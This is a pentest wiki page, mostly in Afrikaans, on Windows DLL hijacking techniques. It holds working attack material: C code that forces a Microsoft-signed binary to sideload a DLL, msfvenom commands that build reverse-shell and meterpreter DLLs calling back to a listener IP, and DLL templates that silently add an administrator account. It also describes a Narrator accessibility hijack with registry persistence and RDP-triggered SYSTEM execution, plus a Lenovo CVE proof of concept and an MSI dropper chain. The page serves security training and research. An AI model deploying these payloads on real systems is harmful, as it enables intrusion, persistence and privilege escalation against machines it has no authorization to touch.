# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n vertroude toepassing sodat dit 'n kwaadwillige DLL laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, die bereik van persistence, en, minder gereeld, privilege escalation. Ondanks die fokus op eskalasie hier, bly die metode van hijacking dieselfde oor verskillende doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, en elkeen se effektiwiteit hang af van die toepassing se DLL-laai strategie:

1. **DLL Replacement**: Verruiling van 'n egte DLL met 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad voor die legitieme een, en spoor die toepassing se soekpatroon aan.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL vir 'n toepassing om te laai, terwyl die toepassing dink dit is 'n nie-bestaande vereiste DLL.
4. **DLL Redirection**: Verander soekparameters soos %PATH% of .exe.manifest / .exe.local lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die legitieme DLL met 'n kwaadwillige teenhanger in die WinSxS gids, 'n metode wat gereeld met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n gebruiker-gekontroleerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution tegnieke.

> [!TIP]
> Vir 'n stap-vir-stap ketting wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading laeer, hersien die workflow hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Opsporing van ontbrekende Dlls

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) vanaf sysinternals te laat loop, en die **volgende 2 filters** te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en wys net die **File System Activity**:

![](<../../../images/image (153).png>)

As jy na **ontbrekende dlls in die algemeen** soek, laat dit vir 'n paar **sekondes** loop.\
As jy na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** soek, stel jy 'n **ander filter soos "Process Name" "contains" `<exec name>`, voer dit uit, en stop die vaslegging van events**.

## Uitbuiting van Ontbrekende Dlls

Om privileges te eskaleer, is die beste kans om 'n DLL te kan skryf wat 'n privilege proses sal probeer laai uit een van die plekke waar dit gesoek gaan word. Dus kan ons 'n DLL skryf in 'n gids waar die DLL gesoek word voordat die gids waar die oorspronklike DLL is (skynbaar vreemde geval), of ons kan skryf in 'n gids waar die DLL gesoek gaan word en die oorspronklike DLL bestaan nie in enige gids nie.

### DLL Search Order

**In die** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vind jy hoe die DLLs spesifiek gelaai word.**

Windows-toepassings soek vir DLLs deur 'n stel vooraf-gedefinieerde soekpaaie te volg, en hou by 'n bepaalde volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n gevaarlike DLL strategies geplaas word in een van hierdie gidse, sodat dit gelaai word voor die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paadjies gebruik wanneer dit na die DLLs verwys wat dit benodig.

Jy kan die **DLL search order op 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **verstek** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die huidige gids op na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (verstek is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens, neem kennis dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval gaan daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, gaan hulle gesoek word soos net gelaai deur naam).

Daar is ander maniere om die soekorde te verander maar ek gaan dit nie hier verduidelik nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Kernidee
- Bou die process parameters met RtlCreateProcessParametersEx en verskaf 'n pasgemaakte DllPath wat na jou gekontroleerde gids wys (bv., die gids waar jou dropper/unpacker leef).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL per naam oplos, sal die loader hierdie verskafde DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE gekoloëer is nie.

Aantekeninge/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL deur naam importeer of LoadLibrary aanroep (geen absolute pad en nie die gebruik van LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardgekodeerde absolute paaie kan nie ge-hijack word nie. Forwarded exports en SxS kan precedensie verander.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Plaas 'n skadelike xmllite.dll (wat die vereiste funksies exporteer of na die werklike een proxy) in jou DllPath-gids.
- Start 'n gesigneerde binêre wat bekend is daarvoor dat dit xmllite.dll by naam soek deur bogenoemde tegniek te gebruik. Die loader los die import via die verskafte DllPath op en sideloads jou DLL.

Hierdie technique is in die wild waargeneem om multi-stage sideloading chains aan te dryf: 'n aanvanklike launcher drop 'n helper DLL, wat dan 'n Microsoft-signed, hijackable binary spawn met 'n custom DllPath om die aanvaller se DLL vanaf 'n staging directory te dwing laai.

#### Uitsonderings op die DLL-soekorde volgens Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekorde word in Windows-dokumentasie aangeteken:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** aangetref word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit standaard op die reeds in geheue gelaaide DLL terugval. **In hierdie scenario voer die stelsel geen soektog vir die DLL uit nie**.
- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows-weergawe erken word, sal die stelsel sy weergawe van die known DLL gebruik, saam met enige van sy afhanklike DLLs, **sonder die soekproses**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie known DLLs.
- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volledige pad geïdentifiseer is.

### Eskalering van privilegge

**Vereistes**:

- Identifiseer 'n proses wat onder **verskillende privilegge** (horizontal of lateral movement) werk of sal werk, wat **sonder 'n DLL** is.
- Verseker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **DLL** sal **gesoek word**. Hierdie ligging kan die gids van die uitvoerbare lêer wees of 'n gids binne die system path.

Ja, die vereistes is moeilik om te vind aangesien dit per verstek vreemd is om 'n privilegievoue uitvoerbare lêer te vind wat 'n DLL mis en dit is selfs vreemder om skryftoestemmings op 'n system path-gids te hê (jy het dit nie per verstek nie). Maar in verkeerd gekonfigureerde omgewings is dit moontlik.\
Indien jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Alhoewel die **hoofdoel van die projek is om UAC te omseil**, mag jy daar 'n **PoC** van 'n Dll hijacking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy skryfregte het te verander).

Neem kennis dat jy jou **regte in 'n gids kan nagaan** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die toestemmings van alle vouers in PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For 'n volledige gids oor hoe om **abuse Dll Hijacking to escalate privileges** met toestemming om te skryf in 'n **System Path folder**, kyk:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outomatiese gereedskap

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal nagaan of jy skryfpermissies het op enige gids binne system PATH.\
Ander interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

Indien jy 'n uitbuitbare scenario vind, een van die belangrikste dinge om dit suksesvol uit te buit, is om 'n dll te skep wat ten minste al die funksies uitvoer wat die uitvoerbare lêer daaruit sal invoer. Let wel dat Dll Hijacking nuttig kan wees om [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** in hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder, in die **volgende afdeling** kan jy sommige **basis dll-kodes** vind wat nuttig kan wees as **templates** of om 'n **dll met nie-vereiste funksies geëksporteer** te skep.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om te **eksponering** en **te werk** soos **verwag** deur alle oproepe aan die werklike biblioteek deur te stuur.

Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik 'n uitvoerbare program aandui en die biblioteek kies wat jy wil proxify en 'n proxified dll genereer, of direk die Dll aandui en 'n proxified dll genereer.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Neem kennis dat in verskeie gevalle die Dll wat jy compile, moet **export several functions** wat deur die victim process gelaai gaan word. As hierdie funksies nie bestaan nie, sal die **binary won't be able to load** hulle en sal die **exploit will fail**.

<details>
<summary>C DLL-sjabloon (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld wat 'n gebruiker skep</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL with thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Toeganklikheid/ATs)

Windows Narrator.exe ondersoek steeds 'n voorspelbare, taalspesifieke lokalisasie-DLL tydens opstart wat gehijack kan word vir arbitraire kode-uitvoering en volhoubaarheid.

Belangrike feite
- Soekpad (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Erfenispad (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n skryfbare, deur die aanvaller beheerde DLL by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` uitgevoer. Geen exports is nodig nie.

Ontdekking met Procmon
- Filtreer: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Begin Narrator en monitor die poging om die bogenoemde pad te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde sal die begin van Narrator die geplante DLL laai. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te begin.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die gasheer; by die logon-skerm druk CTRL+WIN+ENTER om Narrator te launch; jou DLL word as SYSTEM uitgevoer op die secure desktop.
- Uitvoering stop wanneer die RDP-sessie sluit — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n ingeboude Accessibility Tool (AT) registerinskrywing kloon (bv. CursorIndicator), dit wysig om na 'n ewekansige binary/DLL te wys, dit invoer, en dan `configuration` op daardie AT-naam stel. Dit bied 'n manier om ewekansige uitvoering onder die Accessibility-framework te laat gebeur.

Notes
- Skryf onder `%windir%\System32` en die verandering van HKLM-waardes vereis admin-regte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` leef; geen exports is nodig nie.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), gevolg as **CVE-2025-1729**.

### Kwetsbaarheidsbesonderhede

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, wat aandui dat die plaaslike gids se soekk volgorde voorkeur geniet.

### Uitbuiting Implementering

'n aanvaller kan 'n kwaadaardige `hostfxr.dll` stub in dieselfde gids plaas en die ontbrekende DLL uitbuit om kode-uitvoering in die gebruiker se konteks te verkry:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsverloop

1. As 'n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 9:30 AM onder die huidige gebruiker se konteks uitgevoer word.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, hardloop die kwaadwillige DLL in die administrateur se sessie by medium-integriteit.
4. Ketting standaard UAC-bypass-tegnieke om van medium-integriteit na SYSTEM-regte op te gradeer.

## Gevalstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Dreigakteurs kombineer dikwels MSI-gebaseerde droppers met DLL side-loading om payloads uit te voer onder 'n betroubare, ondertekende proses.

Chain overview
- Gebruiker laai 'n MSI af. 'n CustomAction loop stiltydig tydens die GUI-installasie (bv. LaunchApplication of 'n VBScript-aksie), en herbou die volgende fase uit ingeslote hulpbronne.
- Die dropper skryf 'n wettige, ondertekende EXE en 'n kwaadwillige DLL na dieselfde gids (voorbeeldpaar: Avast-ondertekende wsc_proxy.exe + aanvallers-beheerde wsc.dll).
- Wanneer die ondertekende EXE begin word, laai Windows se DLL-soekvolgorde eerstens wsc.dll vanaf die werkgids en voer aanvallerskode uit onder 'n ondertekende ouerproses (ATT&CK T1574.001).

MSI-analise (wat om na te kyk)
- CustomAction-tabel:
  - Soek na inskrywings wat executables of VBScript uitvoer. Voorbeeld van 'n verdagte patroon: LaunchApplication wat 'n ingeslote lêer op die agtergrond uitvoer.
  - In Orca (Microsoft Orca.exe), inspekteer CustomAction, InstallExecuteSequence en Binary-tabelle.
- Ingeslote/gesplitste payloads in die MSI CAB:
  - Administratiewe uitpak: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Of gebruik lessmsi: lessmsi x package.msi C:\out
  - Soek na meerdere klein fragmente wat gekonkateneer en deur 'n VBScript CustomAction gedekrypeer word. Algemene vloei:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: legitieme gesigneerde host (Avast). Die proses probeer wsc.dll per naam vanaf sy gids laai.
- wsc.dll: attacker DLL. As daar geen spesifieke exports benodig word nie, kan DllMain volstaan; andersins bou 'n proxy DLL en stuur vereiste exports na die egte biblioteek terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir eksportvereistes, gebruik 'n proxying framework (e.g., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL naamresolusie deur die host binary. As die host absolute paaie of veilige laaivlagte gebruik (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS, and forwarded exports kan voorrang beïnvloed en moet oorweeg word tydens die keuse van die host binary en export set.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
